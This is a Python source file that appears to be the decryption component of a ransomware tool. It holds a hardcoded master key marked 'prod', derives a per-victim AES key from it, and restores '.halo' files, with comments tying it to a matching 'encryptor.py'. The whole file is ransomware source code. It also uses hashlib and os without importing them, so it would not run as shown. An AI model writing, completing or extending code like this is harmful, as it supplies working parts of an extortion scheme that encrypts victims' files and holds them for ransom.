from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import sys

# MASTER KEY - keep in sync with encryptor.py
MASTER_KEY = b"h4l0_r34p3r_2026_prod_v2"

def derive_key(victim_id: str) -> bytes:
    """
    Derive per-victim decryption key
    Must match encryptor's key derivation exactly
    """
    combined = MASTER_KEY + victim_id.encode('utf-8')
    return hashlib.sha256(combined).digest()

def decrypt_file(file_path: str, victim_id: str) -> bytes:
    """
    Decrypt .halo file using AES-256-CBC
    File format: IV (16 bytes) + encrypted_data
    Returns: decrypted plaintext
    """
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"Encrypted file not found: {file_path}")
    
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    
    if len(encrypted_data) < 16:
        raise ValueError("File too small to contain valid encrypted data")
    
    # Extract IV and ciphertext
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]
    
    # Derive decryption key
    key = derive_key(victim_id)
    
    # Decrypt using AES-256-CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext
    except Exception as e:
        raise ValueError(f"Decryption failed - wrong key or corrupted data: {e}")

def decrypt_to_file(encrypted_path: str, victim_id: str, output_path: str = None):
    """
    Decrypt .halo file and save result
    If output_path is None, removes .halo extension
    """
    decrypted_data = decrypt_file(encrypted_path, victim_id)
    
    if output_path is None:
        if encrypted_path.endswith('.halo'):
            output_path = encrypted_path[:-5]  # Remove .halo extension
        else:
            output_path = encrypted_path + '.decrypted'
    
    with open(output_path, 'wb') as f:
        f.write(decrypted_data)
    
    return output_path
